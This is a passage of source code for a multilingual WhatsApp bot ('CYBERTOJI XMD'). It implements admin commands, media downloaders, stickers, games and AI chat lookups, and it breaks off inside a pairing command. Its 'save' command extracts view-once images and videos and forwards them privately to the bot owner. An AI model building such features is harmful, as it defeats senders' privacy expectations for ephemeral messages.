\uD83C\uDF1F CYBERTOJI XMD est d\u00E9j\u00E0 \u00E0 la derni\u00E8re version.
\uD83D\uDD17 ${_repoUrl}`
            });
            break;
          }

          // npm install pour les nouvelles dépendances
          await sock.sendMessage(remoteJid, {
            text: '\uD83D\uDCE6 Installation des d\u00E9pendances...'
          });
          try {
            execSync('npm install --production 2>&1', { cwd: _cwd, encoding: 'utf8', timeout: 60000 });
          } catch(npmErr) {}

          await sock.sendMessage(remoteJid, {
            text:
`\u2705 *MISE \u00C0 JOUR R\u00C9USSIE!*
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
\uD83D\uDE80 Nouvelles mises \u00E0 jour install\u00E9es!
\uD83D\uDD04 Red\u00E9marrage du bot dans 3s...
\u25B0\u25B0\u25B0\u25B0\u25B0\u25B0\u25B0\u25B0\u25B0\u25B0 100%`
          });

          // Redémarrer après 3 secondes
          setTimeout(() => { process.exit(0); }, 3000);

        } catch(gitErr) {
          // Git non disponible → téléchargement via npm
          await sock.sendMessage(remoteJid, {
            text:
`\u26A0\uFE0F Git non disponible sur ce serveur.

\uD83D\uDCA1 Pour mettre \u00E0 jour manuellement :
\`\`\`
git pull origin main
npm install
\`\`\`

\uD83D\uDD17 ${_repoUrl}

_Ou red\u00E9ploie depuis le panel Pterodactyl._`
          }, { quoted: message });
        }
        break;
      }

      case 'storestatus':
      case 'storeinfo':
      case 'storesave':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }
        await handleStoreStatus(sock, remoteJid, command);
        break;

      // =============================================
      // NOUVELLES COMMANDES OWNER
      // =============================================

      case 'block':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }

        const mentionedBlock = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedBlock) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}block @user`
          });
          break;
        }

        try {
          await sock.updateBlockStatus(mentionedBlock, 'block');
          await sock.sendMessage(remoteJid, {
            text: `🚫 @${mentionedBlock.split('@')[0]} a été bloqué!`,
            mentions: [mentionedBlock]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'unblock':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }

        const mentionedUnblock = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedUnblock) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}unblock @user`
          });
          break;
        }

        try {
          await sock.updateBlockStatus(mentionedUnblock, 'unblock');
          await sock.sendMessage(remoteJid, {
            text: `✅ @${mentionedUnblock.split('@')[0]} a été débloqué!`,
            mentions: [mentionedUnblock]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'join':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}join <lien du groupe>`
          });
          break;
        }

        const inviteLink = args[0].replace('https://chat.whatsapp.com/', '');
        try {
          await sock.groupAcceptInvite(inviteLink);
          await sock.sendMessage(remoteJid, {
            text: '✅ Bot a rejoint le groupe!'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Lien invalide ou erreur' });
        }
        break;

      case 'pp':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }

        if (!message.message?.imageMessage && !message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
          await sock.sendMessage(remoteJid, {
            text: '❌ أرسل ou répondez à une image'
          });
          break;
        }

        try {
          const imageMsg = message.message?.imageMessage || message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
          const stream = await downloadContentFromMessage(imageMsg, 'image');
          const buffer = await toBuffer(stream);
          
          await sock.updateProfilePicture(sock.user.id, buffer);
          await sock.sendMessage(remoteJid, {
            text: '✅ Photo de profil du bot mise à jour!'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'gpp':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminGpp = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGpp && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        if (!message.message?.imageMessage && !message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
          await sock.sendMessage(remoteJid, {
            text: '❌ أرسل ou répondez à une image'
          });
          break;
        }

        try {
          const imageMsg = message.message?.imageMessage || message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
          const stream = await downloadContentFromMessage(imageMsg, 'image');
          const buffer = await toBuffer(stream);
          
          await sock.updateProfilePicture(remoteJid, buffer);
          await sock.sendMessage(remoteJid, {
            text: '✅ Photo de profil du groupe mise à jour!'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ. Je dois être admin.' });
        }
        break;

      case 'delete':
      case 'del':
        const isUserAdminDelete = isGroup ? await isGroupAdmin(sock, remoteJid, senderJid) : true;
        if (!isUserAdminDelete && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }

        if (!message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
          await sock.sendMessage(remoteJid, { text: '❌ Répondez au message à supprimer' });
          break;
        }

        try {
          const quotedMsgKey = message.message.extendedTextMessage.contextInfo;
          await sock.sendMessage(remoteJid, { 
            delete: {
              remoteJid: remoteJid,
              fromMe: false,
              id: quotedMsgKey.stanzaId,
              participant: quotedMsgKey.participant
            }
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Unable de supprimer ce message' });
        }
        break;

      // =============================================
      // 📥 COMMANDES DOWNLOAD (YouTube, TikTok, Insta)
      // =============================================

      case 'play':
      case 'play':
      case 'yt':
      case 'playaudio':
      case 'ytmp3':
      case 'song':
      case 'music':
      case 'playvideo':
      case 'ytvideo':
      case 'ytmp4':
      case 'playptt': {
        if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `❌ *Incorrect usage*\n\n📌 Example:\n${config.prefix}${command} Alan Walker Faded`
          }, { quoted: message });
          break;
        }

        const searchQuery = args.join(' ');
        const p = config.prefix;

        // Helper: utilise ytResolve pour obtenir un vrai fichier audio/vidéo
        async function ytFetch(query) {
          return await ytSearch(query);
        }

        // Helper: download buffer from URL (fetch natif)
        async function fetchBuffer(url) {
          const res = await fetch(url, { signal: AbortSignal.timeout(90000) });
          if (!res.ok) throw new Error(`Download failed: ${res.status}`);
          return Buffer.from(await res.arrayBuffer());
        }

        // Réaction initiale ✨
        try { await sock.sendMessage(remoteJid, { react: { text: "✨", key: message.key } }); } catch(e) {}

        if (command === 'play' || command === 'yt') {
          // ── Menu: afficher titre + 3 choix ──
          try {
            const data = await ytFetch(searchQuery);

            if (!data?.status || !data?.result) {
              await sock.sendMessage(remoteJid, { text: "❌ Video not found. Try another title." }, { quoted: message });
              break;
            }

            const res = data.result;

            await sock.sendMessage(remoteJid, {
              text:
`🎶 *YouTube Player*

📌 *Title:* ${res.searched_title || searchQuery}
🔗 *Link:* ${res.searched_url || 'N/A'}

━━━━━━━━━━━━━━━━━━━━━━━
*Choose your format:*

🎵  ${p}playaudio ${searchQuery}
🎬  ${p}playvideo ${searchQuery}
🎤  ${p}playptt ${searchQuery}
━━━━━━━━━━━━━━━━━━━━━━━
_Reply with the command of your choice_`
            }, { quoted: message });

            // 🎵 Audio automatique après le menu play (si play.mp3 existe)
            await sendCmdAudio(sock, remoteJid);
            try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

          } catch (e) {
            console.error("PLAY MENU ERROR:", e.message);
            await sock.sendMessage(remoteJid, {
              text: `❌ *Search error:* ${e.message}\n\n💡 Check your internet or try again later.`
            }, { quoted: message });
          }

        } else if (['playaudio','ytmp3','song','music','playptt'].includes(command)) {
          // ── Audio or PTT ──
          const isPTT = command === 'playptt';
          try { await sock.sendMessage(remoteJid, { react: { text: isPTT ? "🎤" : "🎵", key: message.key } }); } catch(e) {}
          await sock.sendMessage(remoteJid, {
            text:
`✨ Téléchargement YouTube ✨
───────────────
🎬 Titre : Recherche en cours...
👍 Likes : -
💬 Comments : -
👁️ Views : -
⏳ Progression : 25% ...
───────────────
⚡️ Patiente, ton contenu arrive !`
          });

          try {
            const data = await ytFetch(searchQuery);
            if (!data?.status || !data?.result) {
              await sock.sendMessage(remoteJid, { text: "❌ Video not found." }, { quoted: message });
              break;
            }
            const res = data.result;
            console.log("Download URL:", res.download_url);

            await sock.sendMessage(remoteJid, {
              text:
`✨ Téléchargement YouTube ✨
───────────────
🎬 Titre : ${res.searched_title || searchQuery}
👍 Likes : -
💬 Comments : -
👁️ Views : -
⏳ Progression : 62% ...
───────────────
⚡️ Patiente, ton contenu arrive !`
            });

            const audioBuf = await fetchBuffer(res.download_url);

            await sock.sendMessage(remoteJid, {
              audio:    audioBuf,
              mimetype: "audio/mpeg",
              ptt:      isPTT,
              fileName: `${res.searched_title || 'audio'}.mp3`
            }, { quoted: message });

            await sock.sendMessage(remoteJid, {
              text:
`📥 ${isPTT ? 'PTT' : 'Audio'} YouTube téléchargé !
───────────────
🎬 Titre : ${res.searched_title || searchQuery}
📝 Description :
"_${isPTT ? 'Voice message extrait depuis YouTube' : 'Audio extrait depuis YouTube'}_"
───────────────
𝐂𝐘𝐁𝐄𝐑𝐓𝐎𝐉𝐈-𝐗𝐌𝐃

© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX`
            });

            try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

          } catch (e) {
            console.error("PLAY AUDIO/PTT ERROR:", e.message);
            await sock.sendMessage(remoteJid, {
              text: `❌ *Download error:* ${e.message}\n\n💡 Try again or use a different title.`
            }, { quoted: message });
          }

        } else if (['playvideo','ytvideo','ytmp4'].includes(command)) {
          // ── Video ──
          try { await sock.sendMessage(remoteJid, { react: { text: "🎬", key: message.key } }); } catch(e) {}
          await sock.sendMessage(remoteJid, {
            text:
`✨ Téléchargement YouTube ✨
───────────────
🎬 Titre : ${searchQuery}
👍 Likes : -
💬 Comments : -
👁️ Views : -
⏳ Progression : 30% ...
───────────────
⚡️ Patiente, ton contenu arrive !`
          });

          try {
            const result = await ytResolveVideo(searchQuery);
            console.log("Video URL:", result.videoUrl);

            await sock.sendMessage(remoteJid, {
              text:
`✨ Téléchargement YouTube ✨
───────────────
🎬 Titre : ${result.title || searchQuery}
👍 Likes : -
💬 Comments : -
👁️ Views : -
⏳ Progression : 62% ...
───────────────
⚡️ Patiente, ton contenu arrive !`
            });

            const videoFetch = await fetch(result.videoUrl, {
              headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
              signal: AbortSignal.timeout(180000)
            });
            if (!videoFetch.ok) throw new Error(`HTTP ${videoFetch.status}`);
            const videoData = Buffer.from(await videoFetch.arrayBuffer());
            if (videoData.length < 10000) throw new Error('Fichier vidéo vide');

            await sock.sendMessage(remoteJid, {
              video:    videoData,
              mimetype: 'video/mp4',
              caption:
`📥 Vidéo YouTube téléchargée !
───────────────
🎬 Titre : ${result.title || searchQuery}
📝 Description :
"_Vidéo téléchargée avec succès • ${(videoData.length/1024/1024).toFixed(1)} MB_"
───────────────
𝐂𝐘𝐁𝐄𝐑𝐓𝐎𝐉𝐈-𝐗𝐌𝐃

© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX`,
              fileName: `${result.title || 'video'}.mp4`
            }, { quoted: message });

            try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

          } catch (e) {
            console.error("PLAYVIDEO ERROR:", e.message);
            await sock.sendMessage(remoteJid, {
              text: `❌ *Video error:* ${e.message}\n\n💡 Try !playaudio for audio only.`
            }, { quoted: message });
          }
        }
        break;
      }


      case 'tiktok':
      case 'tt':
      case 'tik':
        await handleTikTok(sock, args, remoteJid, senderJid, message);
        break;

      case 'ig':
      case 'insta':
      case 'instagram':
        await handleInstagram(sock, args, remoteJid, senderJid, message);
        break;

      // =============================================
      // 📊 COMMANDES STATUS
      // =============================================

      case 'tostatus':
      case 'mystatus':
        await handleToStatus(sock, args, message, remoteJid, senderJid);
        break;

      case 'groupstatus':
      case 'gcstatus':
        await handleGroupStatus(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      // =============================================
      // 🎮 COMMANDES GAMES
      // =============================================

      case 'tictactoe':
      case 'ttt':
        await handleTicTacToe(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      case 'quizmanga':
      case 'quiz':
        await handleQuizManga(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      case 'squidgame':
      case 'sg':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        await handleSquidGame(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      // =============================================
      // COMMANDES STICKER
      // =============================================

      case 'sticker':
      case 's':
        try {
          console.log('🔍 Commande sticker reçue');
          console.log('📋 Structure du message:', JSON.stringify(message.message, null, 2));
          
          // Détecter le média de plusieurs façons
          let imageMessage = null;
          let videoMessage = null;
          
          // Cas 1: Image/vidéo directe
          if (message.message?.imageMessage) {
            imageMessage = message.message.imageMessage;
            console.log('✅ Image directe détectée');
          } else if (message.message?.videoMessage) {
            videoMessage = message.message.videoMessage;
            console.log('✅ Vidéo directe détectée');
          }
          // Cas 2: Réponse à un message (quoted)
          else if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            const quoted = message.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.imageMessage) {
              imageMessage = quoted.imageMessage;
              console.log('✅ Image quotée détectée');
            } else if (quoted.videoMessage) {
              videoMessage = quoted.videoMessage;
              console.log('✅ Vidéo quotée détectée');
            }
          }

          if (!imageMessage && !videoMessage) {
            console.log('❌ لم يتم العثور على وسائط');
            await sock.sendMessage(remoteJid, {
              text: `❌ أرسل صورة/فيديو with ${config.prefix}sticker\nOU répondez à صورة/فيديو with ${config.prefix}sticker`
            });
            break;
          }

          const loadingMsg = await sock.sendMessage(remoteJid, { 
            text: '⏳ إنشاء الملصق...' 
          });

          console.log('📥 التنزيل du média...');

          // Télécharger le média
          let buffer;
          let isVideo = false;
          
          if (imageMessage) {
            console.log('📸 التنزيل image...');
            const stream = await downloadContentFromMessage(imageMessage, 'image');
            const chunks = [];
            for await (const chunk of stream) {
              chunks.push(chunk);
            }
            buffer = Buffer.concat(chunks);
            console.log(`✅ تم تنزيل الصورة: ${buffer.length} bytes`);
          } else if (videoMessage) {
            console.log('🎥 التنزيل vidéo...');
            isVideo = true;
            
            // Vérifier la durée AVANT téléchargement
            if (videoMessage.seconds && videoMessage.seconds > 10) {
              await sock.sendMessage(remoteJid, {
                text: '❌ الفيديو طويل جداً! حد أقصى 10 ثوانٍ.',
                edit: loadingMsg.key
              });
              break;
            }
            
            const stream = await downloadContentFromMessage(videoMessage, 'video');
            const chunks = [];
            for await (const chunk of stream) {
              chunks.push(chunk);
            }
            buffer = Buffer.concat(chunks);
            console.log(`✅ تم تنزيل الفيديو: ${buffer.length} bytes`);
          }

          // Vérifier la taille
          const maxSize = isVideo ? 500 * 1024 : 1024 * 1024;
          if (buffer.length > maxSize) {
            await sock.sendMessage(remoteJid, {
              text: `❌ الملف كبير جداً!\nMax: ${isVideo ? '500KB' : '1MB'}\nActuel: ${(buffer.length / 1024).toFixed(0)}KB`,
              edit: loadingMsg.key
            });
            break;
          }

          // Envoyer le sticker
          console.log('📤 Envoi du sticker...');
          await sock.sendMessage(remoteJid, { sticker: buffer });
          
          // Supprimer le message de chargement
          await sock.sendMessage(remoteJid, { delete: loadingMsg.key });

          console.log(`✅ Sent الملصق with succès!`);
          
        } catch (error) {
          console.error('❌ ERREUR STICKER:');
          console.error('الرسالة:', error.message);
          console.error('Stack:', error.stack);
          await sock.sendMessage(remoteJid, {
            text: `❌ خطأ: ${error.message}`
          });
        }
        break;

      case 'take':
      case 'steal':
        try {
          console.log('🔍 Commande take reçue');
          console.log('📋 Structure du message:', JSON.stringify(message.message, null, 2));
          
          // Vérifier si on répond à un sticker
          const quotedSticker = message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage;

          if (!quotedSticker) {
            console.log('❌ Aucun sticker quoté détecté');
            await sock.sendMessage(remoteJid, {
              text: `❌ رد على un sticker with ${config.prefix}take pour le voler!`
            });
            break;
          }

          console.log('✅ Sticker quoté détecté');
          
          const loadingMsg = await sock.sendMessage(remoteJid, { 
            text: '⏳ Vol du sticker in progress...' 
          });

          console.log('📥 التنزيل du sticker...');

          // Télécharger le sticker
          const stream = await downloadContentFromMessage(quotedSticker, 'sticker');
          const chunks = [];
          for await (const chunk of stream) {
            chunks.push(chunk);
          }
          const buffer = Buffer.concat(chunks);
          
          console.log(`✅ Sticker téléchargé: ${buffer.length} bytes`);

          // Re-envoyer le sticker
          console.log('📤 Renvoi du sticker...');
          await sock.sendMessage(remoteJid, { sticker: buffer });
          
          // Supprimer le message de chargement
          await sock.sendMessage(remoteJid, { delete: loadingMsg.key });

          console.log(`✅ Sticker volé with succès!`);
          
        } catch (error) {
          console.error('❌ خطأ vol sticker:', error.message);
          console.error('Stack complet:', error.stack);
          await sock.sendMessage(remoteJid, {
            text: `❌ خطأ: ${error.message}`
          });
        }
        break;

      // =============================================
      // 🤖 COMMANDES IA (GPT & GEMINI)
      // =============================================

      case 'gpt':
      case 'chatgpt':
      case 'ai': {
        if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `🤖 *ChatGPT*\n\n📌 Utilisation:\n${config.prefix}gpt [ta question]\n\nExemple:\n${config.prefix}gpt Explique-moi l'intelligence artificielle`
          }, { quoted: message });
          break;
        }
        const question = args.join(' ');
        try {
          await sock.sendMessage(remoteJid, { react: { text: "🤖", key: message.key } });
          await sock.sendMessage(remoteJid, { text: "⏳ GPT is thinking..." });

          // Essayer plusieurs APIs IA gratuites dans l'ordre
          let reply = null;
          let modelUsed = '';

          // 1. Pollinations.ai (100% gratuit, sans clé)
          try {
            const pollUrl = `https://text.pollinations.ai/${encodeURIComponent(question)}?model=openai&seed=42&json=false`;
            const r = await fetch(pollUrl, { signal: AbortSignal.timeout(20000) });
            if (r.ok) {
              const txt = await r.text();
              if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'GPT-4o (Pollinations)'; }
            }
          } catch(e) { console.error('[Pollinations]', e.message); }

          // 2. OpenAI officiel (si clé valide)
          if (!reply) {
            try {
              const r = await fetch('https://api.openai.com/v1/chat/completions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.openaiApiKey}` },
                body: JSON.stringify({ model: 'gpt-4o-mini', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
                signal: AbortSignal.timeout(20000)
              });
              const d = await r.json();
              if (!d.error && d.choices?.[0]?.message?.content) {
                reply = d.choices[0].message.content.trim();
                modelUsed = 'OpenAI GPT-4o-mini';
              }
            } catch(e) { console.error('[OpenAI]', e.message); }
          }

          // 3. Groq (gratuit avec compte, très rapide - llama3)
          if (!reply) {
            try {
              const r = await fetch('https://api.groq.com/openai/v1/chat/completions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.groqApiKey || ''}` },
                body: JSON.stringify({ model: 'llama3-8b-8192', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
                signal: AbortSignal.timeout(20000)
              });
              const d = await r.json();
              if (!d.error && d.choices?.[0]?.message?.content) {
                reply = d.choices[0].message.content.trim();
                modelUsed = 'Llama 3 (Groq)';
              }
            } catch(e) { console.error('[Groq]', e.message); }
          }

          if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie dans quelques secondes.');

          await sock.sendMessage(remoteJid, {
            text: `🤖 *AI Assistant*\n━━━━━━━━━━━━━━━━━━━━━━━\n❓ *Question:* ${question}\n━━━━━━━━━━━━━━━━━━━━━━━\n💬 *Réponse:*\n${reply}\n━━━━━━━━━━━━━━━━━━━━━━━\n_Powered by ${modelUsed}_`
          }, { quoted: message });

          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch (e) {
          console.error('GPT ERROR:', e.message);
          await sock.sendMessage(remoteJid, {
            text: `❌ *GPT Error:* ${e.message}\n\n💡 Try again later.`
          }, { quoted: message });
        }
        break;
      }

      case 'gemini':
      case 'google':
      case 'bard': {
        if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `✨ *AI Gemini*\n\n📌 Utilisation:\n${config.prefix}gemini [ta question]\n\nExemple:\n${config.prefix}gemini Qu'est-ce que le Big Bang?`
          }, { quoted: message });
          break;
        }
        const question = args.join(' ');
        try {
          await sock.sendMessage(remoteJid, { react: { text: "✨", key: message.key } });
          await sock.sendMessage(remoteJid, { text: "⏳ AI is thinking..." });

          let reply = null;
          let modelUsed = '';

          // 1. Gemini API officielle (si quota dispo)
          try {
            const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
            const r = await fetch(geminiUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ contents: [{ parts: [{ text: question }] }], generationConfig: { maxOutputTokens: 1000 } }),
              signal: AbortSignal.timeout(25000)
            });
            const d = await r.json();
            if (!d.error && d.candidates?.[0]?.content?.parts?.[0]?.text) {
              reply = d.candidates[0].content.parts[0].text.trim();
              modelUsed = 'Google Gemini 2.0 Flash';
            }
          } catch(e) { console.error('[Gemini API]', e.message); }

          // 2. Pollinations.ai openai (POST — plus fiable que GET)
          if (!reply) {
            try {
              const r = await fetch('https://text.pollinations.ai/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'openai', seed: 42 }),
                signal: AbortSignal.timeout(30000)
              });
              if (r.ok) {
                const txt = await r.text();
                if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'GPT-4o (Pollinations)'; }
              }
            } catch(e) { console.error('[Pollinations POST]', e.message); }
          }

          // 3. Pollinations mistral (POST)
          if (!reply) {
            try {
              const r = await fetch('https://text.pollinations.ai/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'mistral', seed: 42 }),
                signal: AbortSignal.timeout(30000)
              });
              if (r.ok) {
                const txt = await r.text();
                if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'Mistral (Pollinations)'; }
              }
            } catch(e) { console.error('[Pollinations Mistral]', e.message); }
          }

          if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie plus tard.');

          await sock.sendMessage(remoteJid, {
            text: `✨ *AI Assistant*\n━━━━━━━━━━━━━━━━━━━━━━━\n❓ *Question:* ${question}\n━━━━━━━━━━━━━━━━━━━━━━━\n💬 *Réponse:*\n${reply}\n━━━━━━━━━━━━━━━━━━━━━━━\n_Powered by ${modelUsed}_`
          }, { quoted: message });

          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch (e) {
          console.error('GEMINI ERROR:', e.message);
          await sock.sendMessage(remoteJid, {
            text: `❌ *AI Error:* ${e.message}`
          }, { quoted: message });
        }
        break;
      }

      // =============================================
      // 💾 COMMANDE SAVE — Enregistrer en privé
      // =============================================
      case 'save':
      case 'sauvegarde':
      case 'garder': {
        try {
          const botPrivateJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          const quotedSender = message.message?.extendedTextMessage?.contextInfo?.participant || senderJid;
          const senderName = message.pushName || senderJid.split('@')[0];

          if (!quoted) {
            await sock.sendMessage(remoteJid, {
              text: `💾 *Commande SAVE*\n\n📌 *Utilisation:*\nRéponds à n'importe quel message avec \`${config.prefix}save\`\n\n• Texte, image, vidéo, audio, sticker, View Once\n\n✅ Le média sera envoyé en privé sur ton numéro bot`
            }, { quoted: message });
            break;
          }

          await sock.sendMessage(remoteJid, { react: { text: "💾", key: message.key } });

          const fromName = quotedSender?.split('@')[0] || 'Unknown';
          const dateStr  = new Date().toLocaleString('fr-FR', { timeZone: 'America/Port-au-Prince' });
          const headerTxt = `💾 *SAUVEGARDÉ*\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 *De:* +${fromName}\n📅 *Date:* ${dateStr}\n💬 *Enregistré par:* ${senderName}\n━━━━━━━━━━━━━━━━━━━━━━━`;

          // Envoyer l'en-tête d'abord
          await sock.sendMessage(botPrivateJid, { text: headerTxt });

          // Détecter et envoyer le type de contenu
          const qViewOnce = quoted.viewOnceMessageV2?.message || quoted.viewOnceMessageV2Extension?.message;
          const qImg   = qViewOnce?.imageMessage  || quoted.imageMessage;
          const qVid   = qViewOnce?.videoMessage  || quoted.videoMessage;
          const qAud   = quoted.audioMessage;
          const qStick = quoted.stickerMessage;
          const qTxt   = quoted.conversation || quoted.extendedTextMessage?.text;
          const qCaption = qImg?.caption || qVid?.caption || '';

          if (qImg) {
            const stream = await downloadContentFromMessage(qImg, 'image');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, {
              image:   buf,
              mimetype: qImg.mimetype || 'image/jpeg',
              caption: qCaption || '📸 Image sauvegardée'
            });
          } else if (qVid) {
            const stream = await downloadContentFromMessage(qVid, 'video');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, {
              video:   buf,
              mimetype: qVid.mimetype || 'video/mp4',
              caption: qCaption || '🎥 Vidéo sauvegardée'
            });
          } else if (qAud) {
            const stream = await downloadContentFromMessage(qAud, 'audio');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, {
              audio:   buf,
              mimetype: qAud.mimetype || 'audio/ogg',
              ptt:     qAud.ptt || false
            });
          } else if (qStick) {
            const stream = await downloadContentFromMessage(qStick, 'sticker');
            const buf    = await toBuffer(stream);
            await sock.sendMessage(botPrivateJid, { sticker: buf });
          } else if (qTxt) {
            await sock.sendMessage(botPrivateJid, {
              text: `💬 *Message sauvegardé:*\n\n${qTxt}`
            });
          } else {
            await sock.sendMessage(botPrivateJid, {
              text: '📎 Contenu sauvegardé (type non reconnu)'
            });
          }

          // Juste une réaction ✅, pas de message de confirmation
          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch(e) {
          console.error('SAVE ERROR:', e.message);
          await sock.sendMessage(remoteJid, {
            text: `❌ *Erreur save:* ${e.message}`
          }, { quoted: message });
        }
        break;
      }

      // =============================================
      // 🎭 COMMANDE SETCMD — Transformer une commande en sticker
      // =============================================
      case 'setcmd':
      case 'cmdsticker':
      case 'stickercmd': {
        try {
          const cmdName = args[0]?.toLowerCase();
          if (!cmdName) {
            await sock.sendMessage(remoteJid, {
              text: `🎭 *Commande SETCMD*\n\n📌 *Utilisation:*\n1️⃣ Réponds à un sticker avec:\n   \`${config.prefix}setcmd [commande]\`\n\n📋 *Exemples:*\n• \`${config.prefix}setcmd play\` → ce sticker lancera !play\n• \`${config.prefix}setcmd gpt\` → ce sticker appellera !gpt\n• \`${config.prefix}setcmd vv\` → ce sticker appellera !vv\n\n✅ Envoie ensuite ce sticker pour exécuter la commande`
            }, { quoted: message });
            break;
          }

          // Chercher un sticker en reply
          const quotedStick = message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage;
          if (!quotedStick) {
            await sock.sendMessage(remoteJid, {
              text: `❌ Réponds à un *sticker* avec \`${config.prefix}setcmd ${cmdName}\``
            }, { quoted: message });
            break;
          }

          // Télécharger le sticker
          const stickerStream = await downloadContentFromMessage(quotedStick, 'sticker');
          const stickerBuf    = await toBuffer(stickerStream);

          // Calculer un hash simple du sticker pour l'identifier
          const stickerHash = stickerBuf.slice(0, 32).toString('hex');

          // Sauvegarder dans une Map globale
          if (!global.stickerCommands) global.stickerCommands = new Map();
          global.stickerCommands.set(stickerHash, cmdName);

          await sock.sendMessage(remoteJid, {
            text: `✅ *Sticker configuré!*\n\n🎭 Ce sticker exécutera: \`${config.prefix}${cmdName}\`\n\n📌 Envoie ce sticker dans n'importe quelle conversation pour déclencher la commande.`
          }, { quoted: message });
          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch(e) {
          console.error('SETCMD ERROR:', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur setcmd: ${e.message}` }, { quoted: message });
        }
        break;
      }

      case 'pair':
      case 'connect':
      case 'adduser':{
        const pN=args[0]?.replace(/[^0-9]/g,'');
        if(!pN||pN.length<7){await sock.sendMessage(remoteJid,{text:`📱 Usage: ${config.prefix}pair NUMERO`});break;}
